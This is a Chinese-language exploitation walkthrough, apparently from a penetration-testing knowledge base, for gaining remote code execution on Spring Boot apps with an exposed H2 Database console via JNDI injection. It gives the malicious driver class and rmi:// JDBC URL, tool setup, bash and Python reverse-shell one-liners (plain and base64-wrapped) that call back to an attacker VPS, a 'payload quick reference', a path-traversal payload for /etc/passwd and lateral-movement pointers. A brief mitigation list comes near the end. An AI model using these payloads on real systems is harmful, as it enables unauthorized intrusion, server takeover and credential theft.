---
title: H2 Console JNDI 注入 RCE 利用
description: 详细记录 H2 Database 控制台未授权访问配合 JNDI 注入（搭配 JNDI-Injection-Exploit 工具）实现远程代码执行的实战攻击链。
category: ai-security
tags:
- H2 Database
- JNDI Injection
- RCE
- Spring Boot
- 漏洞复现
- JNDI-Injection-Exploit
date: '2025-01-14'
updated: '2026-11-12'
---
## 概述

Spring Boot 应用若开启 H2 Database 控制台且配置不当（`spring.h2.console.enabled=true` 且 `spring.h2.console.settings.web-allow-others=true`），将导致数据库管理页面未授权暴露于公网。攻击者可利用 H2 Console 的 **自定义 JDBC URL 与驱动类** 功能，配合 JNDI 注入工具（如 `JNDI-Injection-Exploit`），触发恶意 RMI/LDAP 请求，最终在目标服务器上实现远程代码执行（RCE）。

> **影响范围**：Spring Boot 集成 H2 Database 且开启 Web Console 的应用；JDK 版本未针对 JNDI 注入进行限制（或存在绕过 Gadget）的环境。

## 漏洞成因

H2 Console 登录页面允许用户自定义 **驱动程序类** 与 **JDBC URL**。当驱动类设置为 `javax.naming.InitialContext`，JDBC URL 设置为 `rmi://attacker-ip:port/ExploitName` 时，H2 在尝试建立数据库连接过程中会执行 JNDI Lookup，从而加载远程恶意对象工厂，触发反序列化或动态类加载，导致任意代码执行。

## 利用条件

1.  目标暴露 `/h2-console` 路径（或自定义路径）。
2.  配置 `spring.h2.console.settings.web-allow-others=true`，允许远程访问。
3.  目标 JDK 环境支持 RMI/LDAP 远程类加载（或存在适用的绕过利用链，如 `BypassByEL`）。
4.  攻击者拥有公网 IP（VPS）且端口可达（默认 RMI 1099，工具常用 4444 等自定义端口）。

## 工具准备

- **JNDI-Injection-Exploit**：[https://github.com/su18/JNDI-Injection-Exploit](https://github.com/su18/JNDI-Injection-Exploit)
  - 编译打包后生成 `JNDI-1.0-all.jar`（或下载 Release 预编译版）。
- **监听反弹 Shell**：`nc -lvp <PORT>`

## 实战复现步骤

### 确认 H2 Console 暴露

访问 `http://<target-ip>:<port>/h2-console`，若出现 H2 登录界面且无需密码或可任意登录，确认漏洞存在。

![H2 Console 登录界面](../Images/bf53092ed325f9689a6a0369a3850ade.png)

### 配置 JNDI-Injection-Exploit

#### 修改配置文件 `config.properties`
指定 VPS 公网 IP 与 RMI/LDAP 监听端口（需在 VPS 防火墙/安全组放行）。

```properties
# 示例配置
rmi.server.host=YOUR_VPS_IP
rmi.server.port=4444
ldap.server.port=1389
http.server.port=8080
```

#### 设置恶意命令
工具支持 Base64 编码命令执行。此处构造反弹 Shell 命令：

```bash
# 原始命令
bash -i >& /dev/tcp/YOUR_VPS_IP/4447 0>&1

# Base64 编码
echo "bash -i >& /dev/tcp/YOUR_VPS_IP/4447 0>&1" | base64
# 输出示例: YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMvNDQ0NyAwPiYx
```

在工具界面或配置中设置 `command` 参数：
```text
command=bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMvNDQ0NyAwPiYx}|{base64,-d}|{bash,-i}
```

![配置反弹命令](../Images/d77b68ee79a4becaa019e24092767914.png)

### 启动 JNDI 监听服务

```bash
java -jar JNDI-1.0-all.jar
```
启动成功后，工具将监听 RMI (默认 4444)、LDAP (默认 1389) 及 HTTP (默认 8080) 端口，等待受害者连接。

### 触发 JNDI 注入

在 H2 Console 登录页填写如下信息并点击 **连接测试** 或 **登录**：

| 字段 | 值 |
| :--- | :--- |
| **驱动程序类** | `javax.naming.InitialContext` |
| **JDBC URL** | `rmi://YOUR_VPS_IP:4444/BypassByEL` |
| **用户名/密码** | 任意/空 |

> **注意**：`BypassByEL` 为工具内置的利用链名称，针对高版本 JDK 的 EL 表达式注入绕过。若目标 JDK 版本较低，可尝试 `Exploit` 等其他 Payload 名称。

![H2 Console 注入配置](../Images/0569e7eacc11835ac008194282f1704d.png)

### 获取 Shell

1.  JNDI 工具控制台显示收到 RMI 请求日志。
    ![JNDI 收到请求](../Images/1aea014b78845c41225fbfc2b44eb12f.png)
2.  本地 `nc` 监听端口 (4447) 成功接收反弹 Shell。
    ![成功反弹 Shell](../Images/ba1b1480b1dd5bd4e36b8fb5bc0c55fd.png)

## 关键 Payload 速查

### H2 Console 连接参数
```text
Driver Class: javax.naming.InitialContext
JDBC URL:     rmi://<VPS_IP>:<RMI_PORT>/BypassByEL
```

### 反弹 Shell 命令模板 (Base64 编码后填入工具)
```bash
bash -c {echo,<BASE64_ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}
```
常用原始 Payload:
- `bash -i >& /dev/tcp/<VPS_IP>/<PORT> 0>&1`
- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPS_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

## 关联攻击面与延伸利用

### Spring Boot Actuator + H2 CREATE ALIAS RCE
同属 Spring Boot 生态，若 `/actuator/env` 与 `/actuator/restart` 暴露，可通过修改 `spring.datasource.hikari.connection-test-query` 注入 H2 `CREATE ALIAS` 语句执行命令，**无需 JNDI 依赖 JDK 版本**。
> 详见：[[spring-boot-actuator配置不当rce利用]]

### 冷门场景：Spring Cloud Config 目录穿越
同文章提及，若目标同时运行 Spring Cloud Config Server，可尝试目录穿越读取配置文件获取凭证，辅助横向移动。
> Payload 示例：`/foo/default/master/..%252F..%252Fetc/passwd`

### 内网穿透与横向移动
获取 Shell 后，若目标处于内网，可结合 `frp`、`reGeorg`、`neo-reGeorg` 或 `Metasploit` 路由转发，打通内网访问通道。
> 参考：[[frp内网渗透应用]]

## 防御与缓解建议

1.  **关闭生产环境 Console**：配置 `spring.h2.console.enabled=false`。
2.  **限制访问来源**：若必须开启，设置 `spring.h2.console.settings.web-allow-others=false` (默认)，并结合 Spring Security 或网络层 ACL 限制仅本地/运维 IP 访问。
3.  **升级 JDK 版本**：使用 JDK 8u191+, 11.0.1+, 12.0.1+ 及以上版本，默认限制 `com.sun.jndi.rmi.object.trustURLCodebase` 与 `com.sun.jndi.ldap.object.trustURLCodebase` 为 `false`，阻断远程类加载。
4.  **升级 H2 Database**：更新至 2.0.206 及以上版本，默认限制了控制台的驱动类加载行为。
5.  **WAF/RASP 防护**：部署 RASP Agent 或 WAF 规则拦截 JDBC URL 中包含 `rmi:`, `ldap:`, `ldaps:` 协议的请求。

## 参考资料

- 原文来源：[Spring boot漏洞利用(2)](http://mp.weixin.qq.com/s?__biz=MzIxNzM3MDgyMw==&mid=2247483769&idx=1&sn=f617e310d19cc804a17a617fd806c84f)
- JNDI-Injection-Exploit 项目：[https://github.com/su18/JNDI-Injection-Exploit](https://github.com/su18/JNDI-Injection-Exploit)
- H2 Database 官方文档：[H2 Console Settings](https://www.h2database.com/html/features.html#console_settings)

## 来源

- [007攻防实验室-202007-202010_5](../sources/007攻防实验室-202007-202010_5.md)
